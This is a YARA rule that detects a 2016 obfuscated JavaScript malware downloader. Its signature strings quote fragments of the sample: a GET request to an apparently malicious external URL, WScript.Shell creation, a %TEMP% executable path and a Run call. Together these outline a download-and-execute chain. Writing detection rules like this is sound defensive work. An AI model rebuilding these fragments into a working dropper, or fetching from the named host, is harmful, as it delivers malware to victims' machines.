rule sig_20160330_c585c09d435c847786be28d9f78f96a0 {
  meta:
    description = "datamaliciousorder - file 20160330_c585c09d435c847786be28d9f78f96a0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "664da694ad86a207b7458eaab416a66b79426bac7c9bc97e60d4693d5ef3323f"

  strings:
    $s1  = "_PI[_T](\"GET\", \"http://pro.monbento.com/n3iska\", false);" fullword ascii
    $s2  = "function _G(_Q0, _X0){_AV = _AV * 1; return _Q0 - _X0;};" fullword ascii
    $s3  = "var _MM = function _Q() {return WScript[_A](\"WScript\"+\".Shell\");}(), _Z = 11;" fullword ascii
    $s4  = "if (_PI[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _X(){return _A0 + \"\";};" fullword ascii
    $s6  = "function _MJ() {return _MM[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"nCGhgdWJnLIjWWF.ex\" + \"e\";};" fullword ascii
    $s7  = "function _H() {return ((_LG == true) && (_LG == _AW)) ? 1 : _AV;};" fullword ascii
    $s8  = "function _OL(_L){_MM[\"Run\"](_L, _AV, _AV);};" fullword ascii
    $s9  = "function _Y()" fullword ascii
    $s10 = "function _I(){return 22;};" fullword ascii
    $s11 = "return _G(_US, _S);" fullword ascii
    $s12 = "function _GR(){return _A;};" fullword ascii
    $s13 = "function _IB(_FH) {var _P = (1, 2, 3, 4, 5, _FH); return _P;};" fullword ascii
    $s14 = "var _NP = new this[\"Date\"]();" fullword ascii
    $s15 = " while (_JK){" fullword ascii
    $s16 = "var _S0 = false;" fullword ascii
    $s17 = "_LG = true; " fullword ascii
    $s18 = "_AW = true; " fullword ascii
    $s19 = "var _AW = false;" fullword ascii
    $s20 = "var _LG = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}